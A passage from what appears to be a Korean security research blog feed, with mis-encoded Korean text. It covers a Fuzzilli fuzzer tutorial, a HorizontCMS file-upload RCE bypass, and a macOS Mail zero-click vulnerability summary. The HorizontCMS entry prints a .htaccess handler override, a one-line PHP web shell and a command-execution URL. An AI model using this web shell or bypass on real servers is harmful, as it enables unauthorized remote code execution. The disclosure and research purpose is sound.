ìƒì„±ë©ë‹ˆë‹¤.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%204.png"></p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%205.png"></p><p>FuzzILì—ëŠ” ì—¬ëŸ¬ mutatorê°€ ì¡´ì¬í•˜ëŠ”ë° ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%206.png"></p><ul><li><p>Input Mutator - Inputì„ ë°”ê¿‰ë‹ˆë‹¤.</p></li><li><p>Operation Mutator - Operationì„ ë°”ê¿‰ë‹ˆë‹¤.</p></li><li><p>Splice Mutator -  ë‹¤ë¥¸ corpusì—ì„œ ì½”ë“œë¥¼ ì˜ë¼ì™€ ìƒˆë¡œ ë„£ì–´ì¤ë‹ˆë‹¤.</p></li><li><p>Insertion Mutator - ìƒˆë¡œìš´ ì½”ë“œë¥¼ ë§Œë“¤ì–´ ë„£ì–´ì¤ë‹ˆë‹¤.</p><p>  ë“±ë“± ì—¬ëŸ¬ mutatorê°€ ìˆìŠµë‹ˆë‹¤.</p></li></ul><p>ì´ëŸ¬í•œ mutatorì™€ í•¨ê»˜ feedbackì„ ì¶”ê°€í•´ ì»¤ë²„ë¦¬ì§€ë¥¼ ë†’ì´ëŠ” ë°©ì‹ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><p>FuzzilliëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œ í¼ì§•ì„ ì§„í–‰í•©ë‹ˆë‹¤.</p><p><img src="/2021/04/07/insu/fuzzilli/Untitled%207.png"></p><h1 id="Fuzzilli-ì„¤ì¹˜-ë°-ì‹¤í–‰"><a href="#Fuzzilli-ì„¤ì¹˜-ë°-ì‹¤í–‰" class="headerlink" title="Fuzzilli ì„¤ì¹˜ ë° ì‹¤í–‰"></a>Fuzzilli ì„¤ì¹˜ ë° ì‹¤í–‰</h1><p>Ubuntu 20.04 LTSì—ì„œ ì§„í–‰í–ˆìŠµë‹ˆë‹¤.</p><p>ë¨¼ì € clangê³¼ í•„ìš”í•œ ê²ƒë“¤ì„ ì„¤ì¹˜í•´ì¤ë‹ˆë‹¤.</p><pre><code class="hljs jsx">apt-get install clang clang++ libicu-dev</code></pre><p>ë²„ì „ì— ë§ëŠ” <a href="https://swift.org/download/">swift</a>ë¥¼ ì„¤ì¹˜í•©ë‹ˆë‹¤.</p><p>swiftë¥¼ ì„¤ì¹˜ í•œ ë’¤ PATHë¥¼ ë“±ë¡í•´ì¤ë‹ˆë‹¤.</p><pre><code class="hljs jsx">wget https:<span class="hljs-comment">//swift.org/builds/swift-5.3.3-release/ubuntu2004/swift-5.3.3-RELEASE/swift-5.3.3-RELEASE-ubuntu20.04.tar.gz</span>mkdir ~/swifttar -xvf swift<span class="hljs-number">-5.3</span><span class="hljs-number">.3</span>-RELEASE-ubuntu20<span class="hljs-number">.04</span>.tar.gz -C ~/swift<span class="hljs-keyword">export</span> PATH=~<span class="hljs-regexp">/swift/</span>swift<span class="hljs-number">-5.3</span><span class="hljs-number">.3</span>-RELEASE-ubuntu20<span class="hljs-number">.04</span>/usr/bin/:$PATH</code></pre><p>gitì„ ì´ìš©í•´ fuzzillië¥¼ ë°›ì•„ ë¹Œë“œí•´ì¤ë‹ˆë‹¤.</p><pre><code class="hljs jsx">git clone https:<span class="hljs-comment">//github.com/googleprojectzero/fuzzilli.git</span>cd swiftswift build -c release</code></pre><p>ì‹¤í–‰í•˜ê¸° ì „ì— íƒ€ê¹ƒ ë°”ì´ë„ˆë¦¬ë¥¼ ì»´íŒŒì¼í•´ì•¼ í•˜ëŠ”ë°, chromiumì˜ v8ì„ ê¸°ì¤€ìœ¼ë¡œ ì„¤ëª…í•˜ê² ìŠµë‹ˆë‹¤.</p><p>ë‹¤ìŒì˜ ì½”ë“œë¥¼ í†µí•´ v8 sourceë¥¼ ë°›ê³  ì»´íŒŒì¼í•©ë‹ˆë‹¤.</p><pre><code class="hljs jsx">git clone https:<span class="hljs-comment">//chromium.googlesource.com/chromium/tools/depot_tools.git</span><span class="hljs-keyword">export</span> PATH=<span class="hljs-regexp">/path/</span>to/depot_tools:$PATHmkdir ~/v8cd ~/v8fetch v8cd v8/path/to/fuzzilli/Targets/V8/fuzzbuild.sh</code></pre><p>ì™„ë£Œí•˜ë©´ v8/out/fuzzbuild/d8ì´ ìƒì„±ë©ë‹ˆë‹¤.</p><p>fuzzilliì™€ v8ì„ ëª¨ë‘ ë¹Œë“œí–ˆìœ¼ë©´ ë‹¤ìŒì˜ ëª…ë ¹ì–´ë¥¼ í†µí•´ fuzzillië¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs jsx">swift run FuzzilliCli --profile=v8 ~<span class="hljs-regexp">/Desktop/</span>v8/v8/out/fuzzbuild/d8</code></pre><p>ì‹¤í–‰í•  ë•Œ ì—¬ëŸ¬ ì˜µì…˜ë“¤ì´ ìˆëŠ”ë° ìì„¸í•œ ì˜µì…˜ì€ githubë¥¼ ì°¸ê³ í•˜ë©´ ë©ë‹ˆë‹¤.</p><h1 id="Fuzzilli-ë¶„ì„"><a href="#Fuzzilli-ë¶„ì„" class="headerlink" title="Fuzzilli ë¶„ì„"></a>Fuzzilli ë¶„ì„</h1><p>ë‹¤ìŒì˜ ì½”ë“œëŠ” FuzzilILì„ test í•˜ê¸° ìœ„í•´ ë§Œë“œëŠ” FuzzILì…ë‹ˆë‹¤. ì´ ì½”ë“œë¥¼ í†µí•´ FuzzILì´ ì–´ë–»ê²Œ ë§Œë“¤ì–´ì§€ëŠ”ì§€ mutation ê²°ê³¼ê°€ ì–´ë–»ê²Œ ë˜ëŠ”ì§€ ë¶„ì„ì„ í•´ë³´ê² ìŠµë‹ˆë‹¤.</p><pre><code class="hljs swift"><span class="hljs-keyword">let</span> b = makeBuilder() <span class="hljs-comment">//ILì„ ë‹´ì„ ProgramBuilder ìƒì„±.</span>    <span class="hljs-keyword">let</span> f = b.definePlainFunction(withSignature: <span class="hljs-type">FunctionSignature</span>(withParameterCount: <span class="hljs-number">2</span>)) &#123; params <span class="hljs-keyword">in</span> <span class="hljs-comment">//ì¸ìë¥¼ 2ê°œ ë°›ëŠ” í•¨ìˆ˜ ì„ ì–¸</span>        <span class="hljs-keyword">let</span> x = b.loadProperty(<span class="hljs-string">&quot;x&quot;</span>, of: params[<span class="hljs-number">0</span>]) <span class="hljs-comment">// ì²« ë²ˆì§¸ ì¸ìì˜ x propertyë¥¼ ê°€ì ¸ì˜´.</span>        <span class="hljs-keyword">let</span> y = b.loadProperty(<span class="hljs-string">&quot;y&quot;</span>, of: params[<span class="hljs-number">0</span>]) <span class="hljs-comment">// ì²« ë²ˆì§¸ ì¸ìì˜ y propertyë¥¼ ê°€ì ¸ì˜´.</span>        <span class="hljs-keyword">let</span> s = b.binary(x, y, with: .<span class="hljs-type">Add</span>) <span class="hljs-comment">// xì™€ yì˜ ê°’ì„ ë” í•¨.(ì²« ë²ˆì§¸ ì¸ìì˜ x,y ê°’ì˜ í•©.)</span>        <span class="hljs-keyword">let</span> p = b.binary(s, params[<span class="hljs-number">1</span>], with: .<span class="hljs-type">Mul</span>) <span class="hljs-comment">// sì˜ ê°’ê³¼ ë‘ë²ˆì§¸ ì¸ìë¥¼ ê³±í•¨.</span>        b.doReturn(value: p) <span class="hljs-comment">// pì˜ ê°’ì„ ë¦¬í„´.</span>    &#125;    b.forLoop(b.loadInt(<span class="hljs-number">0</span>), .lessThan, b.loadInt(<span class="hljs-number">1000</span>), .<span class="hljs-type">Add</span>, b.loadInt(<span class="hljs-number">1</span>)) &#123; i <span class="hljs-keyword">in</span> <span class="hljs-comment">// ë°˜ë³µë¬¸ ì„ ì–¸, for(i=0;i&lt;1000;i++)</span>        <span class="hljs-keyword">let</span> x = b.loadInt(<span class="hljs-number">42</span>) <span class="hljs-comment">// x = 42</span>        <span class="hljs-keyword">let</span> y = b.loadInt(<span class="hljs-number">43</span>) <span class="hljs-comment">// y = 43</span>        <span class="hljs-keyword">let</span> arg1 = b.createObject(with: [<span class="hljs-string">&quot;x&quot;</span>: x, <span class="hljs-string">&quot;y&quot;</span>: y]) <span class="hljs-comment">// arg1 = &#123;&quot;x&quot;:42, &quot;y&quot;:43&#125;</span>        <span class="hljs-keyword">let</span> arg2 = i <span class="hljs-comment">//arg2 = i</span>        b.callFunction(f, withArgs: [arg1, arg2]) <span class="hljs-comment">//f(arg1, arg2)</span>    &#125;    <span class="hljs-keyword">return</span> b.finalize() <span class="hljs-comment">// ë§ˆë¬´ë¦¬</span></code></pre><p>ìœ„ì˜ ì½”ë“œë¥¼ ILë¡œ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs swift">v0 &lt;- <span class="hljs-type">BeginPlainFunctionDefinition</span> -&gt; v1, v2    v3 &lt;- <span class="hljs-type">LoadProperty</span> v1, &#x27;x&#x27;    v4 &lt;- <span class="hljs-type">LoadProperty</span> v1, &#x27;y&#x27;    v5 &lt;- <span class="hljs-type">BinaryOperation</span> v3, &#x27;+&#x27;, v4    v6 &lt;- <span class="hljs-type">BinaryOperation</span> v5, &#x27;*&#x27;, v2    <span class="hljs-type">Return</span> v6<span class="hljs-type">EndPlainFunctionDefinition</span>v7 &lt;- <span class="hljs-type">LoadInteger</span> &#x27;<span class="hljs-number">0</span>&#x27;v8 &lt;- <span class="hljs-type">LoadInteger</span> &#x27;<span class="hljs-number">1000</span>&#x27;v9 &lt;- <span class="hljs-type">LoadInteger</span> &#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-type">BeginFor</span> v7, &#x27;&lt;&#x27;, v8, &#x27;+&#x27;, v9 -&gt; v10    v11 &lt;- <span class="hljs-type">LoadInteger</span> &#x27;<span class="hljs-number">42</span>&#x27;    v12 &lt;- <span class="hljs-type">LoadInteger</span> &#x27;<span class="hljs-number">43</span>&#x27;    v13 &lt;- <span class="hljs-type">CreateObject</span> [&#x27;x&#x27;:v11, &#x27;y&#x27;:v12]    v14 &lt;- <span class="hljs-type">CallFunction</span> v0, [v13, v10]<span class="hljs-type">EndFor</span></code></pre><p>ì´ ILì½”ë“œë¥¼ javascript ì½”ë“œë¡œ ë³€í™˜í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ìƒì„±ë©ë‹ˆë‹¤.</p><pre><code class="hljs swift">function main() &#123; <span class="hljs-comment">//v8 code prefix</span>function v0(v1,v2) &#123;    const v3 = v1.x;    const v4 = v1.y;    const v5 = v3 + v4;    const v6 = v5 * v2;    <span class="hljs-keyword">return</span> v6;&#125;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; v10++) &#123;    const v13 = &#123;x:<span class="hljs-number">42</span>,y:<span class="hljs-number">43</span>&#125;;    const v14 = v0(v13,v10);&#125;gc();                              <span class="hljs-comment">//</span>&#125;                                  <span class="hljs-comment">//</span>%<span class="hljs-type">NeverOptimizeFunction</span>(main);      <span class="hljs-comment">// v8 code suffix</span>main();                            <span class="hljs-comment">//</span></code></pre><h2 id="Mutator"><a href="#Mutator" class="headerlink" title="Mutator"></a>Mutator</h2><h3 id="CodeGenMutator"><a href="#CodeGenMutator" class="headerlink" title="CodeGenMutator"></a>CodeGenMutator</h3><p>ê¸°ì¡´ì˜ ì½”ë“œì— ìƒˆë¡œìš´ ì½”ë“œë¥¼ ì‚½ì…í•˜ëŠ” Mutationì„ ì§„í–‰í•©ë‹ˆë‹¤.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>&#123;        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        **v0 = v4;**        **<span class="hljs-keyword">const</span> v6 = [v0,v0,v1,v0];**        <span class="hljs-keyword">const</span> v7 = v5 * v2;        <span class="hljs-keyword">return</span> v7;    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v11 = <span class="hljs-number">0</span>; v11 &lt; <span class="hljs-number">1000</span>; v11++) &#123;        **<span class="hljs-keyword">let</span> v15 = <span class="hljs-built_in">Object</span>();        <span class="hljs-keyword">const</span> v16 = <span class="hljs-built_in">Object</span>;        <span class="hljs-keyword">const</span> v17 = v15--;**        <span class="hljs-keyword">const</span> v18 = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>&#125;;        <span class="hljs-keyword">const</span> v19 = v0(v18,v11);    &#125;gc();&#125;%NeverOptimizeFunction(main);main();</code></pre><h3 id="InputMutator"><a href="#InputMutator" class="headerlink" title="InputMutator"></a>InputMutator</h3><p>randomìœ¼ë¡œ Inputì— ëŒ€í•´ ê³¨ë¼ì„œ ë‹¤ë¥¸ inputìœ¼ë¡œ ë°”ê¿”ì¤ë‹ˆë‹¤.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>&#123;        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        **<span class="hljs-keyword">const</span> v6 = v5 ^ v2;**        <span class="hljs-keyword">return</span> v6;    &#125;    <span class="hljs-keyword">for</span> (**<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">9007199254740992</span>;** v10 &lt; <span class="hljs-number">1000</span>; v10++) &#123;        <span class="hljs-keyword">const</span> v13 = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">a</span>:<span class="hljs-number">43</span>&#125;;        <span class="hljs-keyword">const</span> v14 = v0(v13,v10);    &#125;    gc();    &#125;%NeverOptimizeFunction(main);main();</code></pre><h3 id="OperationMutator"><a href="#OperationMutator" class="headerlink" title="OperationMutator"></a>OperationMutator</h3><p>Operationì„ í•˜ë‚˜ ê³¨ë¼ì„œ mutate í•´ì¤ë‹ˆë‹¤.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>&#123;    <span class="hljs-keyword">const</span> v3 = v1.x;    <span class="hljs-keyword">const</span> v4 = v1.y;    <span class="hljs-keyword">const</span> v5 = v3 + v4;    <span class="hljs-keyword">const</span> v6 = v5 * v2;    <span class="hljs-keyword">return</span> v6;&#125;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; **v10 = v10 &amp;&amp; <span class="hljs-number">1</span>**) &#123;    <span class="hljs-keyword">const</span> v13 = &#123;<span class="hljs-attr">toString</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>&#125;;    <span class="hljs-keyword">const</span> v14 = v0(v13,v10);&#125;gc();&#125;%NeverOptimizeFunction(main);main();</code></pre><h3 id="CombineMutator"><a href="#CombineMutator" class="headerlink" title="CombineMutator"></a>CombineMutator</h3><p>corpusì— ìˆëŠ” ìš”ì†Œ ì¤‘ í•˜ë‚˜ë¥¼ ê³¨ë¼ì„œ ì½”ë“œë¥¼ ì¶”ê°€í•´ì¤ë‹ˆë‹¤.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>&#123;        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        <span class="hljs-keyword">const</span> v6 = v5 * v2;        <span class="hljs-keyword">return</span> v6;    &#125;    **<span class="hljs-keyword">const</span> v11 = <span class="hljs-built_in">Object</span>();**    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v12 = <span class="hljs-number">0</span>; v12 &lt; <span class="hljs-number">1000</span>; v12++) &#123;        <span class="hljs-keyword">const</span> v15 = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>&#125;;        <span class="hljs-keyword">const</span> v16 = v0(v15,v12);    &#125;    gc();&#125;%NeverOptimizeFunction(main);main();</code></pre><h3 id="JITStressMutator"><a href="#JITStressMutator" class="headerlink" title="JITStressMutator"></a>JITStressMutator</h3><p>ì¡´ì¬í•˜ëŠ” í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">v0</span>(<span class="hljs-params">v1,v2</span>) </span>&#123;        <span class="hljs-keyword">const</span> v3 = v1.x;        <span class="hljs-keyword">const</span> v4 = v1.y;        <span class="hljs-keyword">const</span> v5 = v3 + v4;        <span class="hljs-keyword">const</span> v6 = v5 * v2;        <span class="hljs-keyword">return</span> v6;    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> v10 = <span class="hljs-number">0</span>; v10 &lt; <span class="hljs-number">1000</span>; v10++) &#123;        <span class="hljs-keyword">const</span> v13 = &#123;<span class="hljs-attr">x</span>:<span class="hljs-number">42</span>,<span class="hljs-attr">y</span>:<span class="hljs-number">43</span>&#125;;        <span class="hljs-keyword">const</span> v14 = v0(v13,v10);    &#125;    **<span class="hljs-keyword">const</span> v15 = <span class="hljs-built_in">Object</span>;    <span class="hljs-keyword">const</span> v17 = v0(<span class="hljs-number">1000</span>,<span class="hljs-built_in">Object</span>);**    gc();&#125;%NeverOptimizeFunction(main);main();</code></pre><h1 id="ë§ˆì¹˜ë©°"><a href="#ë§ˆì¹˜ë©°" class="headerlink" title="ë§ˆì¹˜ë©°"></a>ë§ˆì¹˜ë©°</h1><p>Fuzzilliì— ëŒ€í•´ ê°„ë‹¨í•˜ê²Œ ì•Œì•„ë³´ì•˜ìŠµë‹ˆë‹¤.<br>ìœ„ì—ì„œ ì†Œê°œí•œ mutator ì™¸ì—ë„ ì—¬ëŸ¬ mutatorê°€ ì¡´ì¬í•˜ê³  ìƒˆë¡œìš´ mutatorë¥¼ ë§Œë“¤ê±°ë‚˜ ìƒˆë¡œìš´ ì†ì„±ë“¤ì„ ì¶”ê°€í•´ì£¼ë©´ì„œ í¼ì €ë¥¼ ê°œì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë˜í•œ ê¸°ì¡´ì˜ javascript íŒŒì¼ì„ FuzzILë¡œ ë³€í™˜í•´ corpusë¥¼ êµ¬ì„±í•´ì£¼ëŠ” ë°©ë²•ì„ í†µí•´ ë°œì „ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>Fuzzillië¥¼ ì˜ ë¶„ì„í•´ì„œ ê°œì„ í•œë‹¤ë©´ js engineì— ëŒ€í•´ íš¨ìœ¨ì ìœ¼ë¡œ í¼ì§• í•  ìˆ˜ ìˆë‹¤ê³  ìƒê°í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>insu</tag>
      
      <tag>fuzzing</tag>
      
      <tag>system</tag>
      
      <tag>fuzzilli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] HorizontCMS ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì </title>
    <link href="/2021/04/06/l0ch/2021-04-06/"/>
    <url>/2021/04/06/l0ch/2021-04-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-2-php-filetype-bypass-4580176223eb">[BugHunt] Authenticated RCE found in HorizontCMS â€” Part 2 (PHP Filetype Bypass)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>HorizontCMS</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì˜¤í”ˆì†ŒìŠ¤ ì»¨í…ì¸  ê´€ë¦¬ ì‹œìŠ¤í…œì¸ HorizontCMSì—ì„œ ê¸°ì¡´ íŒŒì¼ ì—…ë¡œë“œ ì·¨ì•½ì (CVE-2020â€“27387) íŒ¨ì¹˜ì— ëŒ€í•œ ìš°íšŒê°€ ë°œê²¬ë˜ì–´ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ê¸°ì¡´ íŒŒì¼ ì—…ë¡œë“œ ì·¨ì•½ì ì€ <code>.php</code>, <code>.php5</code>, <code>.php7</code>, <code>.phtml</code>, <code>.inc</code> ì™€ ê°™ì€ í™•ì¥ëª…ì´ í¬í•¨ëœ íŒŒì¼ ì—…ë¡œë“œë¥¼ ì œí•œí•˜ëŠ” ê²ƒìœ¼ë¡œ íŒ¨ì¹˜ë˜ì—ˆì§€ë§Œ ì„¤ì • íŒŒì¼ì¸ <code>.htaccess</code> í•„í„°ë§ì„ í•˜ì§€ ì•Šì•„ PHP file typeì„ ë³€ê²½í•œ ìš°íšŒ ê³µê²©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì„ ì´ìš©í•´ ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>admin í˜ì´ì§€ì˜ Media â†’ Filesì—ì„œ <code>test2.htaccess</code> íŒŒì¼ì„ ì—…ë¡œë“œí•©ë‹ˆë‹¤. í•´ë‹¹ íŒŒì¼ì˜ ë‚´ìš©ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.<ul><li><code>AddType application/x-httpd-php .exp</code></li></ul></li><li>íŒŒì¼ rename ê¸°ëŠ¥ì„ ì´ìš©í•´ <code>test2.htaccess</code> íŒŒì¼ì˜ ì´ë¦„ì„ <code>.htaccess</code>ë¡œ ë³€ê²½í•©ë‹ˆë‹¤.</li><li>ì•„ë˜ì™€ ê°™ì´ ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ í•´ì£¼ëŠ” ë‚´ìš©ì´ í¬í•¨ëœ <code>test2.php</code> íŒŒì¼ì„ ì—…ë¡œë“œ í•œ ë’¤ íŒŒì¼ ì´ë¦„ì„ <code>test.exp</code> ë¡œ ë³€ê²½í•©ë‹ˆë‹¤.<ul><li><code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></li></ul></li><li>1, 2ì—ì„œ ì—…ë¡œë“œí•œ <code>.htaccess</code> ë¡œ ì¸í•´ <code>.exp</code> í™•ì¥ìê°€ phpë¡œ ì‹¤í–‰ë©ë‹ˆë‹¤. ë”°ë¼ì„œ <code>test.exp</code>ì— ì ‘ê·¼í•´ ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ol><pre><code class="hljs cpp">http:<span class="hljs-comment">//&lt;HorizontCMS IP&gt;/storage/test.exp?cmd=id</span></code></pre><p>ì·¨ì•½ì  ì œë³´ìëŠ” ì•…ì„± í”ŒëŸ¬ê·¸ì¸ì„ ì•…ìš©í•œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì˜ ê´€ë ¨ ì •ë³´ ë˜í•œ ê³µê°œí•˜ì˜€ìœ¼ë©° <a href="https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-1-malicious-plugins-72846f4ab6fe">https://infosecwriteups.com/bughunt-authenticated-rce-found-in-horizontcms-part-1-malicious-plugins-72846f4ab6fe</a> ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>php</tag>
      
      <tag>bypass</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] macOS Mail ì œë¡œ í´ë¦­ ì·¨ì•½ì </title>
    <link href="/2021/04/05/idioth/2021-04-05/"/>
    <url>/2021/04/05/idioth/2021-04-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mikko-kenttala.medium.com/zero-click-vulnerability-in-apples-macos-mail-59e0c14b106c">Zero click vulnerability in Appleâ€™s macOS Mail</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>macOS Mojave &lt; 10.14.6</li><li>macOS High Sierra &lt; 10.13.6</li><li>macOS Catalina &lt; 10.15.5</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apple Mailì—ì„œ Mailì˜ ìƒŒë“œë°•ìŠ¤ í™˜ê²½ ë‚´ë¶€ì— íŒŒì¼ì„ ì¶”ê°€í•˜ê±°ë‚˜ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” zero click ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì„ í†µí•´ í•´ì»¤ëŠ” ë¹„ë°€ë²ˆí˜¸ ì´ˆê¸°í™”ë¥¼ í†µí•´ ê³„ì •ì„ íƒˆì·¨í•  ìˆ˜ ìˆëŠ” mail redirect ë“±ì„ í¬í•¨í•˜ì—¬ ë©”ì¼ ì„¤ì •ì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë©”ì¼ì—ëŠ” ë‹¤ë¥¸ ë©”ì¼ ì‚¬ìš©ìê°€ ì••ì¶•í•œ ì²¨ë¶€íŒŒì¼ì„ ìë™ìœ¼ë¡œ ì••ì¶• í•´ì œí•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ì‚¬ìš©ìê°€ ì²¨ë¶€íŒŒì¼ë¡œ í´ë”ë¥¼ ì¶”ê°€í•˜ë©´ ìë™ì ìœ¼ë¡œ <code>x-mac-auto-archive=yes</code> headerë¡œ zip ì••ì¶•ë©ë‹ˆë‹¤. ë‹¤ë¥¸ ì‚¬ìš©ìê°€ í•´ë‹¹ ë§¤ì¼ì„ ë°›ìœ¼ë©´ ì••ì¶• ì²¨ë¶€ íŒŒì¼ì€ ìë™ì ìœ¼ë¡œ ì••ì¶•ì´ í•´ì œë©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ì„  zip íŒŒì¼ 2ê°œê°€ í•„ìš”í•©ë‹ˆë‹¤. ì²«ë²ˆì§¸ zip íŒŒì¼ì€ <code>$HOME/Library/Mail</code>ì˜ ì‹¬ë³¼ë¦­ ë§í¬ íŒŒì¼ê³¼ <code>1.txt </code>íŒŒì¼ì„ í¬í•¨í•˜ê³  ë‘ë²ˆì§¸ zip íŒŒì¼ì€ <code>$HOME/Library/Mail</code>ì— ìˆ˜ì •í•˜ë ¤ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì²«ë²ˆì§¸ zip íŒŒì¼ì€ <code>$TMPDIR/com.apple.mail/bom/</code>ì— ì••ì¶• í•´ì œë©ë‹ˆë‹¤. <code>filename=1.txt.zip</code> í—¤ë”ë¥¼ ê¸°ë°˜ìœ¼ë¡œ <code>1.txt</code> íŒŒì¼ì€ ë©”ì¼ ë””ë ‰í„°ë¦¬ì— ë³µì‚¬ë©ë‹ˆë‹¤. ê·¸ í›„ ë‘ë²ˆì§¸ zip íŒŒì¼ì„ í†µí•´ ë©”ì¼ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ruleì„ overwrite í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ ì·¨ì•½ì ì„ í†µí•´ í•´ì»¤ëŠ” <code>$HOME/Library/Mail</code> ë””ë ‰í„°ë¦¬ì˜ ëª¨ë“  íŒŒì¼ì— ì“°ê¸° ê¶Œí•œì„ ê°€ì§ˆ ìˆ˜ ìˆìœ¼ë©° ë¯¼ê°í•œ ë°ì´í„° ëˆ„ì¶œ, ì•…ì˜ì ì¸ ì„¤ì •ì´ ê°€ëŠ¥í•˜ë©° ì›ê²© ì½”ë“œ ì‹¤í–‰ë„ ê°€ëŠ¥ì„± ë˜í•œ ì¡´ì¬í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
